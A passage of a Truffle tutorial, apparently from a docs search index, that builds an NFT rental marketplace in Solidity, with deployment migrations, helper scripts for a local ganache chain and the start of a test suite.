'0x3606594dbcec10924a73112a481fd368257b2a949b9fc1f3cddbbd786ab8f852' , blockNumber: 7551210 , logIndex: 1 , removed: false, transactionHash: '0xc8b9ecaeccdc502ca2c334e2ecafdea17409c631622c8e0c9b26e42ce59f8325' , transactionIndex: 0 , id: 'log_0dd47305' , event: 'NFTRented' , args: [ Result ] } ] } truffle ( goerlidev ) > Write unlist.js \u00b6 const Marketplace = artifacts . require ( \"Marketplace\" ); const NFT_CONTRACT = \"NFT_CONTRACT\" ; const TOKEN_ID = 1 ; const PRICE = 1 ; const ERC721_ABI = [ { \"inputs\" : [ { \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" } ], \"name\" : \"userExpires\" , \"outputs\" : [ { \"internalType\" : \"uint256\" , \"name\" : \"\" , \"type\" : \"uint256\" } ], \"stateMutability\" : \"view\" , \"type\" : \"function\" , \"constant\" : true }, { \"inputs\" : [{ \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" }], \"name\" : \"ownerOf\" , \"outputs\" : [{ \"internalType\" : \"address\" , \"name\" : \"owner\" , \"type\" : \"address\" }], \"stateMutability\" : \"view\" , \"type\" : \"function\" } ]; const main = async ( cb ) => { try { const marketplace = await Marketplace . deployed (); const nftContract = new web3 . eth . Contract ( ERC721_ABI , NFT_CONTRACT ); const expires = await nftContract . methods . userExpires ( TOKEN_ID ). call (); let value = ( Math . floor (( expires - Date . now () / 1000 ) / 60 / 60 / 24 + 1 )) * PRICE ; const owner = await nftContract . methods . ownerOf ( TOKEN_ID ). call (); let options = value < 0 ? { from : owner } : { from : owner , value : value }; let txn = await marketplace . unlistNFT ( NFT_CONTRACT , TOKEN_ID , options ); console . log ( txn ); } catch ( err ) { console . log ( err ); } cb (); } module . exports = main ; You might not have enough ETH in the owner wallet to cover the refund. If so, jump to the bonus section to write a script to fund wallets with ETH on your ganache instance! truffle ( goerlidev ) > exec scripts/unlist.js Using network 'goerlidev' . { tx: '0xe88e20e9543a5053c3e27d69714f1216e0677c202d911e06f2ca644e93b17742' , receipt: { transactionHash: '0xe88e20e9543a5053c3e27d69714f1216e0677c202d911e06f2ca644e93b17742' , transactionIndex: 0 , blockNumber: 7551212 , blockHash: '0xfd3ed03ed838e004494293336b35eb69e56df75efedd8a6b43ca70e94dc9cc24' , from: '0xa31618621805c9215b5ade58eb09dba8f32bbdb8' , to: '0x8f7d9a7effad4d0c93cfdbb8b8a7a0bc1a600baf' , cumulativeGasUsed: 110370 , gasUsed: 110370 , contractAddress: null, logs: [ [ Object ] ] , logsBloom: '0x00000000000000000000004001000000000000000000000000000000008000000000000000000000000000000000000000010000000000000000000000040000000800000000000000000000000000000000000000040000000000000200000000000000020080000000000000000800000000000000000000000000000000000000000000000000000000000000000000000000000000000000040800000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000064000000000000800000000000000000000000000000000000000000000000000000' , status: true, effectiveGasPrice: 2500000007 , type: '0x2' , rawLogs: [ [ Object ] , [ Object ] ] } , logs: [ { address: '0x8f7D9a7EFFAD4d0c93CFdbB8b8A7A0BC1A600baf' , blockHash: '0xfd3ed03ed838e004494293336b35eb69e56df75efedd8a6b43ca70e94dc9cc24' , blockNumber: 7551212 , logIndex: 1 , removed: false, transactionHash: '0xe88e20e9543a5053c3e27d69714f1216e0677c202d911e06f2ca644e93b17742' , transactionIndex: 0 , id: 'log_e724900c' , event: 'NFTUnlisted' , args: [ Result ] } ] } Write run.js \u00b6 Finally, for faster testing, let's just write a script that will run through the whole process from minting to unlisting: const Marketplace = artifacts . require ( \"Marketplace\" ); const NFT_CONTRACT = \"NFT_CONTRACT\" ; const TOKEN_ID = 1 ; const PRICE = 1 ; const ERC721_ABI = [ { \"inputs\" : [ { \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" } ], \"name\" : \"userExpires\" , \"outputs\" : [ { \"internalType\" : \"uint256\" , \"name\" : \"\" , \"type\" : \"uint256\" } ], \"stateMutability\" : \"view\" , \"type\" : \"function\" , \"constant\" : true }, { \"inputs\" : [{ \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" }], \"name\" : \"ownerOf\" , \"outputs\" : [{ \"internalType\" : \"address\" , \"name\" : \"owner\" , \"type\" : \"address\" }], \"stateMutability\" : \"view\" , \"type\" : \"function\" } ]; const main = async ( cb ) => { try { const marketplace = await Marketplace . deployed (); const nftContract = new web3 . eth . Contract ( ERC721_ABI , NFT_CONTRACT ); const expires = await nftContract . methods . userExpires ( TOKEN_ID ). call (); let value = ( Math . floor (( expires - Date . now () / 1000 ) / 60 / 60 / 24 + 1 )) * PRICE ; const owner = await nftContract . methods . ownerOf ( TOKEN_ID ). call (); let options = value < 0 ? { from : owner } : { from : owner , value : value }; let txn = await marketplace . unlistNFT ( NFT_CONTRACT , TOKEN_ID , options ); console . log ( txn ); } catch ( err ) { console . log ( err ); } cb (); } module . exports = main ; BONUS: Write a script to fund your test wallets \u00b6 Scripts allow you to execute common tasks quickly. One thing you might want to do is fund test wallets! Here's a quick utility script to do so. Create a file load.js : const ACCOUNT = \"[ACCOUNT_NUMBER]\" ; const main = async ( cb ) => { try { await web3 . currentProvider . send ({ method : \"evm_setAccountBalance\" , params : [ ACCOUNT , \"0x3635c9adc5dea00000\" ]}, function () {} ) console . log ( await web3 . eth . getBalance ( ACCOUNT )); } catch ( err ) { console . log ( err ); } cb (); } module . exports = main ; In this file, 0x3635c9adc5dea00000 is 1000 ETH in hexadecimal. Now, fund your wallet as follows: truffle ( goerlidev ) > exec scripts/load.js Future Extensions \u00b6 That's it for the smart contract portion of the NFT Rental Marketplace! Be on the lookout for part 2 where we will build the frontend. Sign up for reminders and follow up material here . For a more a detailed walkthrough of the code, be sure to watch the livestream on YouTube . Next episode we'll be covering smart contract automation with Gelato Network. If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, start a discussion here . If you want to show off what you built or just hang with the Unleashed community in general, join our Discord ! Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Web3 Unleashed: Build a NFT Rental Marketplace Part 1"}, {"location": "guides/nft-rental-marketplace/#web3-unleashed-build-a-nft-rental-marketplace-part-1", "text": "Written by Emily Lin Last updated 9/15/2022", "title": "Web3 Unleashed: Build a NFT Rental Marketplace Part 1"}, {"location": "guides/nft-rental-marketplace/#overview", "text": "In episode 2, we covered rentable NFTs (see the tutorial here ). Please go over this beforehand for an explanation of that code. In this guide, we'll create a rental marketplace that will allow users to list and rent rentable NFTs! Specifically, we'll cover: Starting a project using the Truffle React box to prepare for building a frontend in part 2 Writing a rental marketplace contract that will interact with rentable NFTs Deploying contracts that are dependent on each other Writing tests Verifying the RentablePets contract using truffle-plugin-verify on Goerli Etherscan Using Ganache forking and unlocking your MetaMask account locally to test the marketplace contract with already deployed contracts Writing Truffle scripts for fast testing Watch the livestream on YouTube for a more in-depth walkthrough with advanced debugging examples! The completed code lives here .", "title": "Overview"}, {"location": "guides/nft-rental-marketplace/#download-system-requirements", "text": "You'll need to install: Node.js , v14 or higher truffle ganache CLI", "title": "Download System Requirements"}, {"location": "guides/nft-rental-marketplace/#create-an-infura-account-and-project", "text": "To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it rentable-nft , and select Web3 API from the dropdown", "title": "Create an Infura account and project"}, {"location": "guides/nft-rental-marketplace/#register-for-a-metamask-wallet", "text": "To interact with your DApp in the browser, you'll need a MetaMask wallet. You can download it and create one here .", "title": "Register for a MetaMask wallet"}, {"location": "guides/nft-rental-marketplace/#download-vs-code", "text": "Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here .", "title": "Download VS Code"}, {"location": "guides/nft-rental-marketplace/#get-some-test-eth", "text": "In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Paradigm has a great MultiFaucet that deposits funds across 8 different networks all at once.", "title": "Get Some Test Eth"}, {"location": "guides/nft-rental-marketplace/#set-up-your-project", "text": "Since the end goal is a full stack rental marketplace, we'll be starting with Truffle's React Box ! truffle unbox react rental_marketplace cd rental_marketplace Your file structure should look something like this: \u251c\u2500\u2500 LICENSE \u251c\u2500\u2500 README.md \u251c\u2500\u2500 client \u2502 \u251c\u2500\u2500 README.md \u2502 \u251c\u2500\u2500 node_modules \u2502 \u251c\u2500\u2500 package-lock.json \u2502 \u251c\u2500\u2500 package.json \u2502 \u251c\u2500\u2500 public \u2502 \u2514\u2500\u2500 src \u2514\u2500\u2500 truffle \u251c\u2500\u2500 contracts \u251c\u2500\u2500 migrations \u251c\u2500\u2500 package-lock.json \u251c\u2500\u2500 package.json \u251c\u2500\u2500 scripts \u251c\u2500\u2500 test \u2514\u2500\u2500 truffle-config.js We'll only be working with contracts, so hop into the truffle directory. We'll also be using OpenZeppelin's base contracts and test helpers, so let's install that now too. cd truffle npm i @openzeppelin/contracts npm i -D @openzeppelin/test-helpers", "title": "Set Up Your Project"}, {"location": "guides/nft-rental-marketplace/#copy-over-the-rentable-nft-contracts", "text": "Our marketplace will only allow NFTs that fulfill the ERC4907 standard to be listed, so we will also provide users a way to mint their own rentable NFTs. To do so, copy over the contracts we created in the second episode of Web3 Unleashed and delete the existing SimpleStorage contract from the box: IERC4907 ERC4907 RentablePets Also copy: test_rentable_pets.js 1_deploy_contracts.js Also, since we are providing a generic rentable NFT for users to mint, let's rename RentablePets.sol to RentableNft.sol , and change all occurrences of RentablePets to RentableNft in the contract, migration, and test! Your file structure should look like this: \u251c\u2500\u2500 contracts \u2502 \u251c\u2500\u2500 ERC4907.sol \u2502 \u251c\u2500\u2500 IERC4907.sol \u2502 \u2514\u2500\u2500 RentableNft.sol \u251c\u2500\u2500 migrations \u2502 \u2514\u2500\u2500 1_deploy_simple_storage.js \u251c\u2500\u2500 package-lock.json \u251c\u2500\u2500 package.json \u251c\u2500\u2500 scripts \u2502 \u2514\u2500\u2500 increment.js \u251c\u2500\u2500 test \u2502 \u2514\u2500\u2500 test_rentable_nft.js \u2514\u2500\u2500 truffle-config.js Quickly run a truffle test to see if everything was set up correctly.", "title": "Copy over the rentable NFT Contracts"}, {"location": "guides/nft-rental-marketplace/#write-the-marketplace-smart-contract", "text": "With that out of the way, let's get started on our marketplace smart contract! Create a new contract called Marketplace.sol : truffle create contract Marketplace This contract will be long! It's completed form will look like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\" ; import \"@openzeppelin/contracts/utils/Counters.sol\" ; import \"@openzeppelin/contracts/interfaces/IERC165.sol\" ; import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\" ; import \"@openzeppelin/contracts/interfaces/IERC721.sol\" ; import \"./IERC4907.sol\" ; contract Marketplace is ReentrancyGuard { using Counters for Counters . Counter ; using EnumerableSet for EnumerableSet . AddressSet ; using EnumerableSet for EnumerableSet . UintSet ; Counters . Counter private _nftsListed ; address private _marketOwner ; uint256 private _listingFee = .001 ether ; // maps contract address to token id to properties of the rental listing mapping ( address => mapping ( uint256 => Listing )) private _listingMap ; // maps nft contracts to set of the tokens that are listed mapping ( address => EnumerableSet . UintSet ) private _nftContractTokensMap ; // tracks the nft contracts that have been listed EnumerableSet . AddressSet private _nftContracts ; struct Listing { address owner ; address user ; address nftContract ; uint256 tokenId ; uint256 pricePerDay ; uint256 startDateUNIX ; // when the nft can start being rented uint256 endDateUNIX ; // when the nft can no longer be rented uint256 expires ; // when the user can no longer rent it } event NFTListed ( address owner , address user , address nftContract , uint256 tokenId , uint256 pricePerDay , uint256 startDateUNIX , uint256 endDateUNIX , uint256 expires ); event NFTRented ( address owner , address user , address nftContract , uint256 tokenId , uint256 startDateUNIX , uint256 endDateUNIX , uint64 expires , uint256 rentalFee ); event NFTUnlisted ( address unlistSender , address nftContract , uint256 tokenId , uint256 refund ); constructor () { _marketOwner = msg . sender ; } // function to list NFT for rental function listNFT ( address nftContract , uint256 tokenId , uint256 pricePerDay , uint256 startDateUNIX , uint256 endDateUNIX ) public payable nonReentrant { require ( isRentableNFT ( nftContract ), \"Contract is not an ERC4907\" ); require ( IERC721 ( nftContract ). ownerOf ( tokenId ) == msg . sender , \"Not owner of nft\" ); require ( msg . value == _listingFee , \"Not enough ether for listing fee\" ); require ( pricePerDay > 0 , \"Rental price should be greater than 0\" ); require ( startDateUNIX >= block . timestamp , \"Start date cannot be in the past\" ); require ( endDateUNIX >= startDateUNIX , \"End date cannot be before the start date\" ); require ( _listingMap [ nftContract ][ tokenId ]. nftContract == address ( 0 ), \"This NFT has already been listed\" ); payable ( _marketOwner ). transfer ( _listingFee ); _listingMap [ nftContract ][ tokenId ] = Listing ( msg . sender , address ( 0 ), nftContract , tokenId , pricePerDay , startDateUNIX , endDateUNIX , 0 ); _nftsListed . increment (); EnumerableSet . add ( _nftContractTokensMap [ nftContract ], tokenId ); EnumerableSet . add ( _nftContracts , nftContract ); emit NFTListed ( IERC721 ( nftContract ). ownerOf ( tokenId ), address ( 0 ), nftContract , tokenId , pricePerDay , startDateUNIX , endDateUNIX , 0 ); } // function to rent NFT function rentNFT ( address nftContract , uint256 tokenId , uint64 expires ) public payable nonReentrant { Listing storage listing = _listingMap [ nftContract ][ tokenId ]; require ( listing . user == address ( 0 ) || block . timestamp > listing . expires , \"NFT already rented\" ); require ( expires <= listing . endDateUNIX , \"Rental period exceeds max date rentable\" ); // Transfer rental fee uint256 numDays = ( expires - block . timestamp ) / 60 / 60 / 24 + 1 ; uint256 rentalFee = listing . pricePerDay * numDays ; require ( msg . value >= rentalFee , \"Not enough ether to cover rental period\" ); payable ( listing . owner ). transfer ( rentalFee ); // Update listing IERC4907 ( nftContract ). setUser ( tokenId , msg . sender , expires ); listing . user = msg . sender ; listing . expires = expires ; emit NFTRented ( IERC721 ( nftContract ). ownerOf ( tokenId ), msg . sender , nftContract , tokenId , listing . startDateUNIX , listing . endDateUNIX , expires , rentalFee ); } // function to unlist your rental, refunding the user for any lost time function unlistNFT ( address nftContract , uint256 tokenId ) public payable nonReentrant { Listing storage listing = _listingMap [ nftContract ][ tokenId ]; require ( listing . owner != address ( 0 ), \"This NFT is not listed\" ); require ( listing . owner == msg . sender || _marketOwner == msg . sender , \"Not approved to unlist NFT\" ); // fee to be returned to user if unlisted before rental period is up // nothing to refund if no renter uint256 refund = 0 ; if ( listing . user != address ( 0 )) { refund = (( listing . expires - block . timestamp ) / 60 / 60 / 24 + 1 ) * listing . pricePerDay ; require ( msg . value >= refund , \"Not enough ether to cover refund\" ); payable ( listing . user ). transfer ( refund ); } // clean up data IERC4907 ( nftContract ). setUser ( tokenId , address ( 0 ), 0 ); EnumerableSet . remove ( _nftContractTokensMap [ nftContract ], tokenId ); delete _listingMap [ nftContract ][ tokenId ]; if ( EnumerableSet . length ( _nftContractTokensMap [ nftContract ]) == 0 ) { EnumerableSet . remove ( _nftContracts , nftContract ); } _nftsListed . decrement (); emit NFTUnlisted ( msg . sender , nftContract , tokenId , refund ); } /* * function to get all listings * * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that * this function has an unbounded cost, and using it as part of a state-changing function may render the function * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block. */ function getAllListings () public view returns ( Listing [] memory ) { Listing [] memory listings = new Listing []( _nftsListed . current ()); uint256 listingsIndex = 0 ; address [] memory nftContracts = EnumerableSet . values ( _nftContracts ); for ( uint i = 0 ; i < nftContracts . length ; i ++ ) { address nftAddress = nftContracts [ i ]; uint256 [] memory tokens = EnumerableSet . values ( _nftContractTokensMap [ nftAddress ]); for ( uint j = 0 ; j < tokens . length ; j ++ ) { listings [ listingsIndex ] = _listingMap [ nftAddress ][ tokens [ j ]]; listingsIndex ++ ; } } return listings ; } function getListingFee () public view returns ( uint256 ) { return _listingFee ; } function isRentableNFT ( address nftContract ) public view returns ( bool ) { bool _isRentable = false ; bool _isNFT = false ; try IERC165 ( nftContract ). supportsInterface ( type ( IERC4907 ). interfaceId ) returns ( bool rentable ) { _isRentable = rentable ; } catch { return false ; } try IERC165 ( nftContract ). supportsInterface ( type ( IERC721 ). interfaceId ) returns ( bool nft ) { _isNFT = nft ; } catch { return false ; } return _isRentable && _isNFT ; } } Let's walk through the code piece by piece!", "title": "Write the Marketplace Smart Contract"}, {"location": "guides/nft-rental-marketplace/#imports", "text": "import \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\" ; import \"@openzeppelin/contracts/utils/Counters.sol\" ; import \"@openzeppelin/contracts/interfaces/IERC165.sol\" ; import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\" ; import \"@openzeppelin/contracts/interfaces/IERC721.sol\" ; import \"./IERC4907.sol\" ; If you followed our guide in episode 2 , you should be familiar with the Counters , IERC165 , IERC721 , and IERC4907 , and Counters contracts. We're using two new ones here: EnumerableSet is a nifty utility contract that will help us with storing our rental listings ReentrancyGuard is a contract we can inherit to protect our contract from reentrancy attacks since we will be transferring ETHer between accounts In order to use ReentrancyGuard , we want Marketplace to inherit ReentrancyGuard : contract Marketplace is ReentrancyGuard {", "title": "Imports"}, {"location": "guides/nft-rental-marketplace/#contract-variables", "text": "using Counters for Counters . Counter ; using EnumerableSet for EnumerableSet . AddressSet ; using EnumerableSet for EnumerableSet . UintSet ; This is just syntactic sugar for using these contracts. You can read more about it here . address private _marketOwner ; uint256 private _listingFee = .001 ether ; In our marketplace, we want to pass a listing fee to the owner of the marketplace contract any time a NFT rental is listed. Counters . Counter private _nftsListed ; // maps contract address to token id to properties of the rental listing mapping ( address => mapping ( uint256 => Listing )) private _listingMap ; // maps nft contracts to set of the tokens that are listed mapping ( address => EnumerableSet . UintSet ) private _nftContractTokensMap ; // tracks the nft contracts that have been listed EnumerableSet . AddressSet private _nftContracts ; This next set of code is for how we are storing the listing data. Solidity doesn't allow for map iterability, so we have to do some creative workarounds here. Namely, we store the keys we would iterate over in OpenZeppelin's EnumerableSet . How it is used will become more obvious when we go over getAllListings . _nftsListed simply tracks how many nfts are currently listed. _listingMap is a map of maps that will give us listing information for a specific tokenId in an NFT contract. _nftContractTokensMap will tell us all the tokenIds listed from a particular NFT contract. _nftContracts is a set of all the NFT contracts that have been listed. struct Listing { address owner ; address user ; address nftContract ; uint256 tokenId ; uint256 pricePerDay ; uint256 startDateUNIX ; // when the nft can start being rented uint256 endDateUNIX ; // when the nft can no longer be rented uint256 expires ; // when the user can no longer rent it } event NFTListed ( address owner , address user , address nftContract , uint256 tokenId , uint256 pricePerDay , uint256 startDateUNIX , uint256 endDateUNIX , uint256 expires ); event NFTRented ( address owner , address user , address nftContract , uint256 tokenId , uint256 startDateUNIX , uint256 endDateUNIX , uint64 expires , uint256 rentalFee ); event NFTUnlisted ( address unlistSender , address nftContract , uint256 tokenId , uint256 refund ); These last variables are just the data we want to store and emit about a particular listing. Specifically: owner is the address of the token owner user is the address of the user (i.e., renter). If there is none, it is the zero address nftContract is the NFT contract address (i.e., the NFT collection) tokenId is the tokenId of the listed NFT within the NFT collection pricePerDay is how much wei it costs to rent the NFT for one day startDateUNIX is the UNIX timestamp for when the NFT is ready to be rented endDateUNIX is the UNIX timestamp for when the NFT should no longer be rentable expires is when the rental period for a user will end. If there is no renter, this is 0 rentalFee is how much it costed to rent the NFT refund is for when the owner decides to unlist their NFT while someone is still renting it. In this case, the owner must refund the user however many days before the rental period was supposed to end.", "title": "Contract Variables"}, {"location": "guides/nft-rental-marketplace/#modify-the-marketplace-constructor", "text": "Since we want to pass a listing fee to the marketplace owner whenever an NFT is listed, we'll need to store that information upon deployment. Modify the constructor as follows: constructor () { _marketOwner = msg . sender ; }", "title": "Modify the Marketplace Constructor"}, {"location": "guides/nft-rental-marketplace/#write-listnft", "text": "// function to list NFT for rental function listNFT ( address nftContract , uint256 tokenId , uint256 pricePerDay , uint256 startDateUNIX , uint256 endDateUNIX ) public payable nonReentrant { require ( isRentableNFT ( nftContract ), \"Contract is not an ERC4907\" ); require ( IERC721 ( nftContract ). ownerOf ( tokenId ) == msg . sender , \"Not owner of nft\" ); require ( msg . value == _listingFee , \"Not enough ether for listing fee\" ); require ( pricePerDay > 0 , \"Rental price should be greater than 0\" ); require ( startDateUNIX >= block . timestamp , \"Start date cannot be in the past\" ); require ( endDateUNIX >= startDateUNIX , \"End date cannot be before the start date\" ); require ( _listingMap [ nftContract ][ tokenId ]. nftContract == address ( 0 ), \"This NFT has already been listed\" ); payable ( _marketOwner ). transfer ( _listingFee ); _listingMap [ nftContract ][ tokenId ] = Listing ( msg . sender , address ( 0 ), nftContract , tokenId , pricePerDay , startDateUNIX , endDateUNIX , 0 ); _nftsListed . increment (); EnumerableSet . add ( _nftContractTokensMap [ nftContract ], tokenId ); EnumerableSet . add ( _nftContracts , nftContract ); emit NFTListed ( IERC721 ( nftContract ). ownerOf ( tokenId ), address ( 0 ), nftContract , tokenId , pricePerDay , startDateUNIX , endDateUNIX , 0 ); } listNFT requires that: the NFT is ERC4907 and ERC721 compliant the owner of the NFT is listing it the listing properties (i.e. price, start date, end date) are valid values the owner has enough ETH to cover the listing fee the NFT has not already been listed We create a helper method isRentableNFT to check for the token standard compliance: function isRentableNFT ( address nftContract ) public view returns ( bool ) { bool _isRentable = false ; bool _isNFT = false ; try IERC165 ( nftContract ). supportsInterface ( type ( IERC4907 ). interfaceId ) returns ( bool rentable ) { _isRentable = rentable ; } catch { return false ; } try IERC165 ( nftContract ). supportsInterface ( type ( IERC721 ). interfaceId ) returns ( bool nft ) { _isNFT = nft ; } catch { return false ; } return _isRentable && _isNFT ; } In particular, we check using Solidity's try catch syntax, since it is possible that the contract passed in does not support the ERC165 standard either. In that case, we want to gracefully fail and exit. This method is public because we intend to call it in our frontend later to check for NFT validity. Finally, listNFT simply transfers the listing fee over to the marketplace owner, and stores the relevant listing info. Note that the user is first set to the zero address and expires is set to 0 since no one has rented the NFT yet. Do notice that we marked the function as nonReentrant , which is a modifier inherited from ReentrancyGuard to protect against reentrancy attacks, and payable , which ensures the function can send and receive ETH.", "title": "Write listNFT()"}, {"location": "guides/nft-rental-marketplace/#write-rentnft", "text": "// function to rent an NFT function rentNFT ( address nftContract , uint256 tokenId , uint64 expires ) public payable nonReentrant { Listing storage listing = _listingMap [ nftContract ][ tokenId ]; require ( listing . user == address ( 0 ), \"NFT already rented\" ); require ( expires <= listing . endDateUNIX , \"Rental period exceeds max date rentable\" ); // Transfer rental fee uint256 numDays = ( expires - block . timestamp ) / 60 / 60 / 24 + 1 ; uint256 rentalFee = listing . pricePerDay * numDays ; require ( msg . value >= rentalFee , \"Not enough ether to cover rental period\" ); payable ( listing . owner ). transfer ( rentalFee ); // Update listing IERC4907 ( nftContract ). setUser ( tokenId , msg . sender , expires ); listing . user = msg . sender ; listing . expires = expires ; emit NFTRented ( IERC721 ( nftContract ). ownerOf ( tokenId ), msg . sender , nftContract , tokenId , listing . startDateUNIX , listing . endDateUNIX , expires , rentalFee ); } This function handles the actual renting logic! We first grab the listing information and declare it as storage , since we want to modify contract state when we edit it. Again, we make some checks beforehand to ensure that the NFT can be rented, and the user has enough ETH to do so. For this dapp, we assume the rental period starts right away. There is no ability to reserve NFTs later on. To calculate the number of days in a rental period, we add 1, because Solidity rounds down in integer division. After transferring the rental fee, we call setUser so that other dapps can check rental information on the NFT. It is important to note that setUser requires that the Marketplace contract has approval to do so (if you recall from the implementation of it in episode 2). When we call this contract method in our dapp, we need to first call the ERC721 approve method to give it permission to do so. Otherwise, this transaction will fail.", "title": "Write rentNFT()"}, {"location": "guides/nft-rental-marketplace/#write-unlistnft", "text": "unlistNFT allows the owner of the NFT to take down their listing. However, if they choose to do so while an NFT is still being rented, they must refund the user the appropriate amount for the days lost. // function to unlist your rental, refunding the user for any lost time function unlistNFT ( address nftContract , uint256 tokenId ) public payable nonReentrant { Listing storage listing = _listingMap [ nftContract ][ tokenId ]; require ( listing . owner != address ( 0 ), \"This NFT is not listed\" ); require ( listing . owner == msg . sender || _marketOwner == msg . sender , \"Not approved to unlist NFT\" ); // fee to be returned to user if unlisted before rental period is up uint256 refund = (( listing . expires - block . timestamp ) / 60 / 60 / 24 + 1 ) * listing . pricePerDay ; require ( msg . value >= refund , \"Not enough ether to cover refund\" ); payable ( listing . user ). transfer ( refund ); // clean up data IERC4907 ( nftContract ). setUser ( tokenId , address ( 0 ), 0 ); EnumerableSet . remove ( _nftContractTokensMap [ nftContract ], tokenId ); delete _listingMap [ nftContract ][ tokenId ]; if ( EnumerableSet . length ( _nftContractTokensMap [ nftContract ]) == 0 ) { EnumerableSet . remove ( _nftContracts , nftContract ); } _nftsListed . decrement (); emit NFTUnlisted ( msg . sender , nftContract , tokenId , refund ); } Again, we validate that: The NFT is listed Only the owner or marketplace owner can unlist an NFT Enough ETH is available to refund the user At the end, we want to clean up our data, which entails: Removing the rental info from the NFT Removing the NFT from the stored listings", "title": "Write unlistNFT()"}, {"location": "guides/nft-rental-marketplace/#write-getalllistings", "text": "This function returns all the listings stored, regardless of whether or not the rental period has expired or the time is not within startDateUNIX and endDateUNIX. While this is possible to do in Solidity, this kind of filtering should be handled off-chain to reduce gas costs. /* * function to get all listings * * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that * this function has an unbounded cost, and using it as part of a state-changing function may render the function * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block. */ function getAllListings () public view returns ( Listing [] memory ) { Listing [] memory listings = new Listing []( _nftsListed . current ()); uint256 listingsIndex = 0 ; address [] memory nftContracts = EnumerableSet . values ( _nftContracts ); for ( uint i = 0 ; i < nftContracts . length ; i ++ ) { address nftAddress = nftContracts [ i ]; uint256 [] memory tokens = EnumerableSet . values ( _nftContractTokensMap [ nftAddress ]); for ( uint j = 0 ; j < tokens . length ; j ++ ) { listings [ listingsIndex ] = _listingMap [ nftAddress ][ tokens [ j ]]; listingsIndex ++ ; } } return listings ; } As mentioned before, Solidity maps are not iterable. In order to get around it, we store the keys we want to step over in two separate arrays. Given this is an unbounded list, be careful not to call this in the context of a state change. Otherwise, the computational costs could get very high and the transaction would fail due to gas costs.", "title": "Write getAllListings()"}, {"location": "guides/nft-rental-marketplace/#write-getlistingfee", "text": "Finally, we have a simple helper function to expose the listing fee in our tests and scripts. function getListingFee () public view returns ( uint256 ) { return _listingFee ; }", "title": "Write getListingFee()"}, {"location": "guides/nft-rental-marketplace/#modify-rentablenft", "text": "There's actually one last piece we need to handle! For our marketplace smart contract, we want to give it automatic approval for NFTs minted from the RentableNFT contract. To do so, we need to pass in the marketplace contract address to RentableNFT and set the approval in the mint function. Modify the constructor and contract variables in RentableNft : contract RentableNft is ERC4907 { using Counters for Counters . Counter ; address private _marketplaceContract ; Counters . Counter private _tokenIds ; constructor ( address marketplaceContract ) ERC4907 ( \"RentableNft\" , \"RNFT\" ) { _marketplaceContract = marketplaceContract ; } Lastly, modify mint to set the approval: function mint ( string memory _tokenURI ) public { _tokenIds . increment (); uint256 newTokenId = _tokenIds . current (); _safeMint ( msg . sender , newTokenId ); setApprovalForAll ( _marketplaceContract , true ); _setTokenURI ( newTokenId , _tokenURI ); }", "title": "Modify RentableNft"}, {"location": "guides/nft-rental-marketplace/#modify-1_deploy_contractjs", "text": "Now, we need to deploy our Marketplace contract, passing in its address to the RentableNft constructor to set approvals. Your migration file should look like this: const RentableNft = artifacts . require ( \"RentableNft\" ); const Marketplace = artifacts . require ( \"Marketplace\" ); module . exports = async function ( deployer ) { await deployer . deploy ( Marketplace ); const marketplace = await Marketplace . deployed (); await deployer . deploy ( RentableNft , marketplace . address ); };", "title": "Modify 1_deploy_contract.js"}, {"location": "guides/nft-rental-marketplace/#write-tests", "text": "Our marketplace contract is done! Now, it's time to write tests. truffle create test TestMarketplace Your completed test should look like this: require ( \"@openzeppelin/test-helpers/configure\" )({ provider : web3 . currentProvider , singletons : { abstraction : \"truffle\" , }, }); const { balance , constants , ether , expectRevert , expectEvent } = require ( '@openzeppelin/test-helpers' ); const Marketplace = artifacts . require ( \"Marketplace\" ); const RentableNft = artifacts . require ( \"RentableNft\" ); const TODAY = Math . floor ( Date . now () / 1000 ); const TODAY_2 = TODAY + ( 60 * 60 ); const YESTERDAY = TODAY - ( 24 * 60 * 60 ); const TOMORROW = TODAY + ( 24 * 60 * 60 ); const IN_FIVE_DAYS = TODAY + ( 24 * 60 * 60 * 5 ); function assertListing ( actual , expected ) { assert . equal ( actual . owner , expected . owner , \"Owner is not correct\" ); assert . equal ( actual . user , expected . user , \"User is not correct\" ); assert . equal ( actual . nftContract , expected . nftContract , \"NFT contract is not correct\" ); assert . equal ( actual . tokenId , expected . tokenId , \"TokenId is not correct\" ); assert . equal ( actual . pricePerDay , expected . pricePerDay , \"Price per day is not correct\" ); assert . equal ( actual . startDateUNIX , expected . startDateUNIX , \"Start date is not correct\" ); assert . equal ( actual . endDateUNIX , expected . endDateUNIX , \"End date is not correct\" ); assert . equal ( actual . expires , expected . expires , \"Expires date is not correct\" ); } async function assertNFT ( nftContractInstance , tokenId , expectedUser , expectedExpires ) { let user = await nftContractInstance . userOf . call ( tokenId ); let expires = await nftContractInstance . userExpires . call ( tokenId ); assert . equal ( user , expectedUser , \"User is not correct\" ); assert . equal ( expires , expectedExpires , \"Expires date is incorrect\" ); } // EnumerableSet makes no guarantee about ordering, so we have to find the matching tokenId function getListing ( listings , tokenId ) { let listing = {}; listings . every (( _listing ) => { if ( _listing . tokenId == tokenId ) { listing = _listing ; return false ; } else { return true ; } }); 